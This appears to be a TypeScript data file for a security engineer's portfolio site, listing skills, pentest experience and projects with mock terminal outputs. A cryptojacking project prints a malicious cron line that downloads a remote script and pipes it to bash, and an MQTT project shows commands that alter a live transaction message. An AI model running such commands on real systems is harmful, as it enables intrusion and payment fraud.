import type {
  PersonalInfo, Stat, SkillCategory, ExperienceItem,
  Project, Certification, Education, CTFProfile
} from '@/types';

export const PERSONAL: PersonalInfo = {
  name:           'Sthitaprajna Biswal',
  nameShort:      'STHITAPRAJNA',
  title:          'Information Security Engineer · Application VAPT Specialist',
  tagline:        'Securing FinTech. Hunting vulnerabilities. Automating defenses.',
  email:          'sthitabiswal2002@gmail.com',
  phone:          '+91-9078225080',
  github:         'https://github.com/sthitiprajnya',
  githubUser:     'sthitiprajnya',
  linkedin:       'https://www.linkedin.com/in/sthitaprajna-biswal-0175b7171/',
  location:       'Bhubaneswar, Odisha, India',
  locationShort:  'Bhubaneswar, India',
  availability:   true,
  currentRole:    'Information Security Engineer',
  currentCompany: 'iServeU Technology Pvt. Ltd.',
  resumeUrl:      '/portfolio/resume/Sthitaprajna_Biswal_Resume.pdf',
};

export const HERO_ROLES: string[] = [
  'Application VAPT Specialist.',
  'Cloud Security Engineer.',
  'Red Team Practitioner.',
  'AppSec Professional.',
  'Security Automation Engineer.',
];

// Scrolling threat-intel ticker messages shown at the bottom of the Hero section.
// Each entry represents a real engagement highlight, formatted like a SOC alert feed.
export const HERO_TICKER: string[] = [
  '⬤ CRITICAL · SQL INJECTION · AXIS BANK API ENDPOINT · STATUS: REMEDIATED',
  '⬤ CRITICAL · UNAUTH MQTT BROKER · AWS PAYMENT MICROSERVICES · STATUS: HARDENED',
  '⬤ HIGH · PRIVILEGE ESCALATION PATH · GCP PROD CLUSTER · STATUS: PATCHED',
  '⬤ HIGH · PAN/AADHAAR EXPOSURE · 6 LEGACY BANKING ENDPOINTS · STATUS: MASKED',
  '⬤ HIGH · GCS BUCKET MISCONFIGURATION · 92+ BUCKETS · STATUS: LOCKED',
  '⬤ INCIDENT · CRYPTOJACKING · GCP INFRASTRUCTURE · MTTD 4.2H · STATUS: CONTAINED',
  '⬤ COMPLIANCE · PCI DSS v4.0.1 · NPCI AUDIT · RESULT: ZERO NON-CONFORMANCES',
  '⬤ COMPLIANCE · ISO 27001:2022 · UIDAI AUDIT · RESULT: ZERO NON-CONFORMANCES',
];

export const HERO_STATS: Stat[] = [
  { value: 50,  suffix: '+', label: 'Pen Tests' },
  { value: 230, suffix: '+', label: 'Vulnerabilities' },
  { value: 11,  suffix: '',  label: 'Certifications' },
  { value: 2,   suffix: '+', label: 'Yrs Experience' },
];

export const ABOUT_STATS: Stat[] = [
  { value: 50,  suffix: '+', label: 'Pen Tests Executed' },
  { value: 230, suffix: '+', label: 'Unique Vulnerabilities' },
  { value: 8,   suffix: '',  label: 'Compliance Audits' },
  { value: 11,  suffix: '',  label: 'Certifications' },
];

export const ABOUT_BIO = [
  "Information Security Engineer at iServeU Technology, where I've spent 2+ years breaking production FinTech systems before the bad actors can. I've executed 50+ full-scope penetration tests across web applications, REST/SOAP APIs, mobile apps, and cloud infrastructure — uncovering 230+ unique vulnerabilities for clients including NPCI, UIDAI, Axis Bank, Kotak Mahindra, and Bank of Baroda.",
  "My work lives at the intersection of offense and engineering — I don't just find the hole, I build the PoC, write the remediation playbook, and track closure to zero. Double award winner at iServeU: Best Intern 2024, Rising Performer 2025. Actively seeking roles in Cloud Security, AppSec, and Red Team operations.",
];

export const TERMINAL_LINES = [
  { prompt: '$', command: 'whoami' },
  { prompt: '>', output: 'sthitaprajna_biswal' },
  { prompt: '$', command: 'cat current_role.txt' },
  { prompt: '>', output: 'Information Security Engineer' },
  { prompt: '>', output: 'iServeU Technology · Bhubaneswar' },
  { prompt: '$', command: 'echo $SEEKING' },
  { prompt: '>', output: 'CLOUD_SECURITY | APPSEC | RED_TEAM', cursor: true },
];

export const SKILLS: SkillCategory[] = [
  {
    category: 'Security Tools',
    color: 'cyan',
    skills: [
      { name: 'Burp Suite Pro', icon: 'burpsuite',  proficiency: 95, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used for advanced web application and API exploitation.' },
      { name: 'Nessus',         icon: 'nessus',     proficiency: 88, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used for network vulnerability scanning.' },
      { name: 'Kali Linux',     icon: 'kali',       proficiency: 92, domain: 'OFFENSIVE', experience: '3+ years', description: 'Primary penetration testing OS.' },
      { name: 'Metasploit',     icon: 'metasploit', proficiency: 80, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used for exploiting known vulnerabilities.' },
      { name: 'Nmap',           icon: 'nmap',       proficiency: 90, domain: 'OFFENSIVE', experience: '3+ years', description: 'Used for network discovery and security auditing.' },
      { name: 'Nuclei',         icon: 'nuclei',     proficiency: 80, domain: 'OFFENSIVE', experience: '1.5 years', description: 'Used for fast and customizable vulnerability scanning.' },
      { name: 'SQLMap',         icon: 'sqlmap',     proficiency: 82, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used for automated SQL injection detection and exploitation.' },
      { name: 'Wireshark',      icon: 'wireshark',  proficiency: 85, domain: 'OFFENSIVE', experience: '2.5 years', description: 'Used for network protocol analysis.' },
      { name: 'Frida / MobSF',  icon: 'frida',      proficiency: 70, domain: 'OFFENSIVE', experience: '1 year', description: 'Used for mobile application security testing.' },
      { name: 'Aircrack-ng',    icon: 'aircrack',   proficiency: 72, domain: 'OFFENSIVE', experience: '1 year', description: 'Used for wireless network security assessments.' },
      { name: 'SpiderFoot',     icon: 'spiderfoot', proficiency: 78, domain: 'OFFENSIVE', experience: '2 years', description: 'Used for automated OSINT gathering.' },
      { name: 'OWASP ZAP',      icon: 'zap',        proficiency: 75, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used as an alternative DAST tool.' },
    ],
  },
  {
    category: 'Cloud & Containers',
    color: 'amber',
    skills: [
      { name: 'GCP Security',    icon: 'gcp',        proficiency: 80, domain: 'CLOUD', experience: '2 years', description: 'Hardening GCP resources and IAM.' },
      { name: 'AWS Security Hub',icon: 'aws',        proficiency: 75, domain: 'CLOUD', experience: '2 years', description: 'Securing AWS infrastructure and services.' },
      { name: 'Kubernetes / GKE',icon: 'kubernetes', proficiency: 78, domain: 'CLOUD', experience: '1 year', description: 'Assessing K8s cluster security.' },
      { name: 'Docker Security', icon: 'docker',     proficiency: 82, domain: 'CLOUD', experience: '1.5 years', description: 'Securing container deployments.' },
      { name: 'CIS Benchmarks',  icon: 'cis',        proficiency: 80, domain: 'COMPLIANCE', experience: '2+ years', description: 'Implementing security benchmarks.' },
    ],
  },
  {
    category: 'SIEM & Monitoring',
    color: 'green',
    skills: [
      { name: 'Wazuh',        icon: 'wazuh',   proficiency: 85, domain: 'AUTOMATION', experience: '2 years', description: 'Configuring and managing SIEM solutions.' },
      { name: 'Zabbix',       icon: 'zabbix',  proficiency: 68, domain: 'AUTOMATION', experience: '1.5 years', description: 'Monitoring network and server health.' },
      { name: 'Log Analysis', icon: 'logs',    proficiency: 82, domain: 'AUTOMATION', experience: '2.5 years', description: 'Analyzing logs for threat hunting and incident response.' },
    ],
  },
  {
    category: 'Scripting & Automation',
    color: 'violet',
    skills: [
      { name: 'Python 3.x',        icon: 'python',     proficiency: 88, domain: 'AUTOMATION', experience: '3+ years', description: 'Writing custom exploit scripts and automation tools.' },
      { name: 'Bash',              icon: 'bash',       proficiency: 85, domain: 'AUTOMATION', experience: '3+ years', description: 'Automating tasks and managing Linux environments.' },
      { name: 'PowerShell',        icon: 'powershell', proficiency: 72, domain: 'AUTOMATION', experience: '2 years', description: 'Automating Windows administration and post-exploitation tasks.' },
      { name: 'Google Apps Script',icon: 'appscript',  proficiency: 70, domain: 'AUTOMATION', experience: '1.5 years', description: 'Automating reporting and workflows.' },
    ],
  },
  {
    category: 'Frameworks & Standards',
    color: 'violet',
    skills: [
      { name: 'OWASP Top 10',  icon: 'owasp',   proficiency: 95, domain: 'COMPLIANCE', experience: '3+ years', description: 'Identifying and mitigating critical web application security risks.' },
      { name: 'MITRE ATT&CK',  icon: 'mitre',   proficiency: 88, domain: 'COMPLIANCE', experience: '2+ years', description: 'Mapping threat actor tactics and techniques.' },
      { name: 'PCI DSS v4.0.1',icon: 'pcidss',  proficiency: 85, domain: 'COMPLIANCE', experience: '2 years', description: 'Ensuring compliance with payment card industry standards.' },
      { name: 'ISO 27001:2022', icon: 'iso27001',proficiency: 82, domain: 'COMPLIANCE', experience: '1.5 years', description: 'Understanding information security management systems.' },
      { name: 'PTES',           icon: 'ptes',    proficiency: 88, domain: 'COMPLIANCE', experience: '2+ years', description: 'Following standard penetration testing execution methodology.' },
      { name: 'NIST CSF',       icon: 'nist',    proficiency: 78, domain: 'COMPLIANCE', experience: '2 years', description: 'Implementing cybersecurity frameworks.' },
    ],
  },
];

export const EXPERIENCE: ExperienceItem[] = [
  {
    id:          'iserveU',
    company:     'iServeU Technology Pvt. Ltd.',
    role:        'Information Security Engineer / Penetration Tester',
    location:    'Bhubaneswar, India',
    period:      'Dec 2023 – Present',
    periodShort: '2023 – Present',
    type:        'Full-time',
    tags:        ['Burp Suite Pro','Nessus','GCP','AWS','Kubernetes','Docker','Wazuh','Python','Bash','OWASP','MITRE ATT&CK','PCI DSS','ISO 27001'],
    awards:      ['Best Intern Award 2024', 'Rising Performer Award 2025'],
    subsections: [
      {
        id:    'vapt',
        label: 'Application VAPT',
        color: 'cyan',
        bullets: [
          'Led 50+ full-scope web application penetration tests against FinTech, BFSI, and payment platforms using Burp Suite Pro — uncovered 200+ vulnerabilities including IDOR, auth bypass, session fixation, XSS, SQL injection, XXE, SSRF, CSRF, and broken access controls; every engagement closed with exploit-backed PoC reports aligned to OWASP Top 10.',
          'Performed REST & SOAP API security assessments on BBPS, UPI, and payment gateway integrations — identified and closed 12 critical/high findings in IndusInd Bank API integrations within a 3-week window ahead of compliance deadline.',
          'Executed Android and iOS VAPT covering insecure data storage, certificate pinning bypass, and traffic interception via Burp Suite Pro across mobile payment apps deployed to millions of end-users.',
          'Delivered threat-aware architecture reviews and DFDs for 8 payment platforms; mapped 40+ design-level attack vectors — recommendations adopted by engineering teams reduced architecture-level findings in subsequent VAPT cycles by ~55%.',
          'Discovered PAN and Aadhaar exposure across 6 legacy banking endpoints and 3 misconfigured GCS buckets; constructed end-to-end exfiltration PoC chains; led Google DLP API implementation (Python 3.10) classifying and masking PCI/PII data across 500+ daily transactions.',
        ],
      },
      {
        id:    'cloud',
        label: 'Cloud, Infrastructure & Adversarial Ops',
        color: 'amber',
        bullets: [
          'Enumerated and exploited misconfigurations across 92+ GCP Cloud Storage buckets and over-privileged IAM roles exposing sensitive payment data; led end-to-end hardening (private bucket enforcement, IAM least-privilege, CMEK) — eliminated 100% of identified public exposure paths with zero production outages.',
          'Conducted internal VAPT of GCP compute instances, VMs, and Kubernetes nodes — uncovered 3 privilege escalation paths and 5 lateral movement vectors across production segments; proposed and implemented network segmentation across 200+ internal services.',
          'Led red-team-style investigation of a live cryptojacking incident on GCP; traced initial access, 2 persistence mechanisms (malicious cron/systemd), and crypto-mining payload; designed 6 new Wazuh detection rules cutting MTTD for similar attacks by ~80%.',
          'Identified unauthenticated MQTT broker in AWS-based payment services capable of manipulating live financial transactions; built working PoC demonstrating the full attack chain; drove broker hardening (mTLS, ACLs, auth) across 4 payment microservices before any regulatory review.',
          'Executed wireless security assessments identifying WEP/WPA weaknesses and 4 rogue APs across campus networks adjacent to payment infrastructure; validated WPA3 migration and VLAN segmentation.',
        ],
      },
      {
        id:    'compliance',
        label: 'Compliance, Automation & SIEM',
        color: 'violet',
        bullets: [
          'Owned 8 end-to-end security audits (PCI DSS v4.0.1, ISO 27001:2022, SOC 2 Type 2) for clients including NPCI, UIDAI, UCO Bank, Bank of Baroda, Axis Bank, Kotak Mahindra, BoM, BoI, NSDL, Slice — framed all findings from an attacker perspective with PoC narratives; achieved full closure with zero non-conformance carry-overs.',
          'Built Python, Bash, and Google Apps Script pipelines (JIRA REST API) to automate VAPT ticket tracking, risk dashboards, and SLA breach alerts — improved high-risk finding closure rates by 35% and reduced manual reporting effort by ~8 hours/week.',
          'Deployed Wazuh SIEM from scratch for centralised monitoring across endpoints, cloud services, and network devices; authored 20+ custom detection rules reducing false-positive volume by 45% while increasing true-positive detection rate.',
        ],
      },
    ],
  },
];

export const PROJECTS: Project[] = [
  {
    id:          'dlp-pipeline',
    title:       'Google DLP Pipeline — PCI/PII Masking at Scale',
    description: 'Python pipeline classifying and masking PAN & Aadhaar data across 500+ daily FinTech transactions using the Google DLP API. Included discovery of PAN exposure across 6 legacy banking endpoints and 3 GCS buckets, with full exfiltration PoC chains.',
    category:    'automation',
    tags:        ['Python 3.10', 'Google DLP API', 'GCP', 'Data Classification', 'PCI/PII'],
    imageUrl:    'https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?auto=format&fit=crop&q=80&w=800',
    imageAlt:    'Google DLP Pipeline architecture diagram',
    githubUrl:   '', // REPO: PRIVATE — ENTERPRISE
    featured:    false,
    year:        2024,
    impact:      '500+ daily transactions protected',
    methodology: 'Reconnaissance (Bucket discovery) → Exploitation (Data exfiltration PoC) → Remediation (DLP API integration for real-time masking)',
    terminalOutput: [
      { command: 'gcloud storage ls gs://legacy-fintech-data', output: ['gs://legacy-fintech-data/txn_logs_2023/', 'gs://legacy-fintech-data/kyc_dump/'] },
      { command: 'python3 dlp_masker.py --bucket "legacy-fintech-data"', output: ['[+] Initializing Google DLP API...', '[*] Scanning 1,402 files for PCI/PII...', '[+] Masked 34,210 PANs and 12,050 Aadhaar numbers.', '[-] Zero public exposure remaining.'] }
    ]
  },
  {
    id:          'wazuh-siem',
    title:       'Wazuh SIEM — Custom Rule Engine',
    description: 'End-to-end Wazuh SIEM deployment with 20+ custom detection rules; reduced false-positive volume by 45% while increasing true-positive detection. Tuning insights fed directly into subsequent red-team engagements.',
    category:    'cloud',
    tags:        ['Wazuh', 'Python', 'Log Analysis', 'Detection Engineering', 'Linux'],
    imageUrl:    'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=800',
    imageAlt:    'Wazuh SIEM dashboard with custom detection rules',
    githubUrl:   '', // REPO: PRIVATE — ENTERPRISE
    featured:    false,
    year:        2024,
    impact:      '45% false-positive reduction',
    methodology: 'Threat Modeling (Identify gaps) → Rule Engineering (XML/Regex) → Validation (Red team simulation) → Tuning (False positive reduction)',
    terminalOutput: [
      { command: 'cat /var/ossec/etc/rules/local_rules.xml | grep "level=\\"12\\""', output: ['<rule id="100001" level="12">', '  <if_sid>5716</if_sid>', '  <match>failed password</match>', '  <description>Custom: High frequency brute-force detected</description>', '</rule>'] }
    ]
  },
  {
    id:          'gcp-hardening',
    title:       'GCP Cloud Storage Hardening — 92+ Buckets',
    description: 'Full attack surface enumeration and exploitation of misconfigurations across 92+ GCP Cloud Storage buckets and over-privileged IAM roles. Led end-to-end hardening: private bucket enforcement, IAM least-privilege, CMEK. Eliminated 100% of public exposure paths with zero production outages.',
    category:    'cloud',
    tags:        ['GCP', 'IAM', 'CMEK', 'Cloud Storage', 'CIS Benchmarks', 'Python'],
    imageUrl:    'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&q=80&w=800',
    imageAlt:    'GCP security hardening',
    githubUrl:   '', // REPO: PRIVATE — ENTERPRISE
    featured:    true,
    year:        2024,
    impact:      '100% public exposure eliminated',
    methodology: 'Reconnaissance (IAM enumeration) → Exploitation (Cross-project privilege escalation PoC) → Remediation (CMEK enforcement & IAM policies)',
    terminalOutput: [
      { command: 'gcloud projects get-iam-policy prod-payment-gw --format=json', output: ['{', '  "bindings": [', '    { "role": "roles/storage.admin", "members": ["allUsers"] }', '  ]', '}'] },
      { command: './apply_hardening.sh --target prod-payment-gw', output: ['[WARN] Public access detected on 3 buckets.', '[+] Removing "allUsers" bindings...', '[+] Enabling Uniform Bucket-Level Access...', '[✓] Hardening complete. Public exposure: 0%'] }
    ]
  },
  {
    id:          'mqtt-poc',
    title:       'MQTT/IoT Attack Chain PoC — AWS Payment Services',
    description: 'Identified an unauthenticated MQTT broker in AWS-based payment microservices capable of manipulating live financial transactions. Built a complete working PoC demonstrating the full attack chain. Drove broker hardening across 4 payment microservices before any regulatory review.',
    category:    'security',
    tags:        ['MQTT', 'AWS', 'Python', 'IoT Security', 'Protocol Abuse', 'PoC Development'],
    imageUrl:    'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&q=80&w=800',
    imageAlt:    'MQTT attack chain proof of concept',
    githubUrl:   '', // REPO: RESTRICTED — ACTIVE CLIENT
    featured:    true,
    year:        2024,
    impact:      '4 payment microservices hardened',
    methodology: 'Reconnaissance (Port scanning/Service discovery) → Exploitation (Unauthenticated topic subscription/injection) → Remediation (mTLS, ACLs)',
    terminalOutput: [
      { command: 'mosquitto_sub -h payment-broker.internal.aws -t "#" -v', output: ['finance/txn/live {"id": 8841, "amt": 50.00, "status": "pending"}', 'sys/health {"cpu": 45, "mem": 60}'] },
      { command: 'mosquitto_pub -h payment-broker.internal.aws -t "finance/txn/live" -m \'{"id": 8841, "amt": 50.00, "status": "approved"}\'', output: ['[+] Message published successfully.', '[!] Transaction state manipulated.'] }
    ]
  },
  {
    id:          'vapt-automation',
    title:       'VAPT Automation Pipeline — JIRA + Python',
    description: 'Python, Bash, and Google Apps Script automation for VAPT ticket tracking, risk dashboards, and SLA breach alerts via JIRA REST API. Improved high-risk finding closure rates by 35% and reduced manual reporting effort by ~8 hours/week.',
    category:    'automation',
    tags:        ['Python', 'Bash', 'Google Apps Script', 'JIRA REST API', 'Automation'],
    imageUrl:    'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&q=80&w=800',
    imageAlt:    'VAPT automation pipeline dashboard',
    githubUrl:   '', // REPO: PRIVATE — ENTERPRISE
    featured:    false,
    year:        2024,
    impact:      '35% faster finding closure',
    methodology: 'Workflow Analysis (Identify bottlenecks) → Integration (JIRA REST API) → Automation (Python scripts & Cron) → Reporting (Google Apps Script dashboards)',
    terminalOutput: [
      { command: 'python3 sync_findings.py --source burp.xml --project SEC', output: ['[+] Parsing Burp Suite XML report...', '[+] Extracted 14 High, 22 Medium findings.', '[+] Creating JIRA tickets...', '[✓] Successfully synced 36 findings to JIRA project SEC.'] }
    ]
  },
  {
    id:          'crypto-incident',
    title:       'Cryptojacking Incident — Detection & Response',
    description: 'Red-team-style investigation of a live cryptojacking incident on GCP. Traced initial access vector, 2 persistence mechanisms (malicious cron/systemd jobs), and the crypto-mining payload. Designed 6 new Wazuh detection rules cutting MTTD for similar attacks by ~80%.',
    category:    'security',
    tags:        ['GCP', 'Wazuh', 'Incident Response', 'Forensics', 'Linux', 'Detection Engineering'],
    imageUrl:    'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=800',
    imageAlt:    'Cryptojacking incident investigation timeline',
    githubUrl:   '', // REPO: RESTRICTED
    featured:    true,
    year:        2024,
    impact:      '80% faster future detection',
    methodology: 'Containment (Isolate instance) → Forensics (Memory dump & log analysis) → Eradication (Remove persistence) → Hardening (Deploy Wazuh rules)',
    terminalOutput: [
      { command: 'ps aux --sort=-%cpu | head -n 5', output: ['USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND', 'www-data  1337 99.5  2.1 234120 18450 ?        Ssl  10:14 300:15 /tmp/kdevtmpfsi'] },
      { command: 'crontab -l -u www-data', output: ['* * * * * wget -q -O - http://185.x.x.x/script.sh | bash'] }
    ]
  },
];

export const CERTIFICATIONS: Certification[] = [
  { id: 'ejpt',     name: 'eJPT v2',                            issuer: 'eLearnSecurity',          year: 2024, color: 'cyan',   status: 'active', verifyUrl: 'https://my.ine.com/certificate/', expiry: '2027-05-10' },
  { id: 'peh',      name: 'Practical Ethical Hacker (PEH)',     issuer: 'TCM Security',             year: 2024, color: 'green',  status: 'active', verifyUrl: 'https://certifications.tcm-sec.com/', expiry: 'No expiry' },
  { id: 'icca',     name: 'INE Certified Cloud Associate',      issuer: 'INE Security',             year: 2024, color: 'amber',  status: 'active', verifyUrl: '#', expiry: '2027-08-15' },
  { id: 'cyberops', name: 'CyberOps Associate',                 issuer: 'Cisco Systems',            year: 2023, color: 'cyan',   status: 'active', verifyUrl: '#', expiry: '2026-11-20' },
  { id: 'ccna',     name: 'CCNA v1.7',                          issuer: 'Cisco Systems',            year: 2023, color: 'cyan',   status: 'active', verifyUrl: '#', expiry: '2026-06-12' },
  { id: 'ehe',      name: 'Ethical Hacking Essentials (EHE)',   issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: '#', expiry: '2026-03-05' },
  { id: 'nde',      name: 'Network Defence Essentials (NDE)',   issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: '#', expiry: '2026-04-18' },
  { id: 'dfe',      name: 'Digital Forensics Essentials (DFE)', issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: '#', expiry: '2026-05-22' },
  { id: 'cybersec', name: 'Cybersecurity Essentials',           issuer: 'Cisco',                    year: 2022, color: 'cyan',   status: 'active', verifyUrl: '#', expiry: 'No expiry' },
  { id: 'pcap',     name: 'PCAP — Python Certified',            issuer: 'OpenEDG Python Institute', year: 2023, color: 'green',  status: 'active', verifyUrl: '#', expiry: 'No expiry' },
  { id: 'kali',     name: 'Basic to Advanced Kali Linux',       issuer: 'CRAW Security',            year: 2023, color: 'green',  status: 'active', verifyUrl: '#', expiry: 'No expiry' },
];

/**
 * Mapping of certification issuers to their logo asset paths.
 * Centralized here to decouple logo logic from UI components.
 */
export const CERT_ISSUER_LOGOS: Record<string, string> = {
  'Cisco Systems':              '/portfolio/logos/certs/cisco.svg',
  'Cisco':                      '/portfolio/logos/certs/cisco.svg',
  'eLearnSecurity':             '/portfolio/logos/certs/cisco.svg',
  'INE Security':               '/portfolio/logos/certs/cisco.svg',
  'TCM Security':               '/portfolio/logos/certs/tcm.png',
  'EC-Council':                 '/portfolio/logos/certs/eccouncil.svg',
  'OpenEDG Python Institute':   '/portfolio/logos/certs/openedg.png',
  'CRAW Security':              '/portfolio/logos/certs/craw.png',
  'ISC2':                       '/portfolio/logos/certs/isc2.png',
  'KodeKloud':                  '/portfolio/logos/cloud/docker.svg',
};

export const UPCOMING_CERTIFICATIONS: Certification[] = [
  { id: 'oscp', name: 'Offensive Security Certified Professional (OSCP)', issuer: 'OffSec', year: 2025, color: 'amber', status: 'in-progress', verifyUrl: '' },
  { id: 'crtp', name: 'Certified Red Team Professional (CRTP)', issuer: 'Altered Security', year: 2025, color: 'green', status: 'in-progress', verifyUrl: '' },
  { id: 'gcp-sec', name: 'Professional Cloud Security Engineer', issuer: 'Google Cloud', year: 2025, color: 'cyan', status: 'in-progress', verifyUrl: '' },
];

export const EDUCATION: Education[] = [
  {
    degree:      'Bachelor of Technology — Computer Science & Engineering',
    institution: 'Veer Surendra Sai University of Technology (VSSUT)',
    location:    'Bhubaneswar, India',
    period:      '2020 – 2024',
    grade:       '',
  },
];

// ── CTF / War Games Data ────────────────────────────────────────
// UPDATE THESE VALUES with your actual HackTheBox stats.
// Your HTB profile: https://app.hackthebox.com/users/[your-id]
export const CTF_PROFILE: CTFProfile = {
  htbUsername:          'sthitiprajnya', // ← update if different
  htbRank:              'Hacker',        // ← update (Pro Hacker, Elite Hacker, etc.)
  htbPoints:            1240,            // ← update
  htbUserOwns:          24,              // ← update
  htbRootOwns:          18,              // ← update
  htbChallengesSolved:  45,              // ← update
  globalPercentile:     15,             // ← top N%
  competitions: [
    {
      name:    'HackTheBox Cyber Apocalypse 2024',
      year:    2024,
      placement: 'Top 20%',
      solved:  6,
      tags:    ['Web', 'Forensics', 'Misc'],
    },
    {
      name:    'NahamCon CTF 2024',
      year:    2024,
      placement: 'Top 25%',
      solved:  8,
      tags:    ['Web', 'OSINT', 'Crypto'],
    },
    {
      name:    'PicoCTF 2023',
      year:    2023,
      placement: 'Top 30%',
      solved:  12,
      tags:    ['Web', 'Binary', 'Forensics'],
    },
  ],
  // These bars reflect real-world skill emphasis, not just HTB stats.
  attackCategories: [
    { label: 'Web Application',   level: 95 },
    { label: 'API Security',      level: 90 },
    { label: 'Cloud / IaaS',      level: 80 },
    { label: 'Network Protocols', level: 78 },
    { label: 'OSINT',             level: 75 },
    { label: 'Mobile (Android)',  level: 70 },
    { label: 'Cryptography',      level: 55 },
    { label: 'Reverse Engineering',level: 42 },
  ],
  recentActivity: [
    { title: 'Sightless', type: 'machine', difficulty: 'Easy', date: '2025-05-15' },
    { title: 'BoardLight', type: 'machine', difficulty: 'Easy', date: '2025-05-02' },
    { title: 'ProxyAsAService', type: 'challenge', difficulty: 'Medium', date: '2025-04-20' },
    { title: 'PermX', type: 'machine', difficulty: 'Easy', date: '2025-04-10' },
  ],
};

// Resume highlight bullets — used by the ResumePanel section
export const RESUME_HIGHLIGHTS = [
  { label: 'ENGAGEMENTS',   value: '50+',  detail: 'Full-scope pen tests executed' },
  { label: 'VULNS FOUND',   value: '230+', detail: 'Unique vulnerabilities documented' },
  { label: 'CLIENTS',       value: '15+',  detail: 'FinTech & BFSI organisations' },
  { label: 'CERTS',         value: '11',   detail: 'Industry certifications held' },
  { label: 'COMPLIANCE',    value: '8',    detail: 'PCI DSS / ISO 27001 audits' },
  { label: 'AWARDS',        value: '2',    detail: 'Best Intern + Rising Performer' },
];
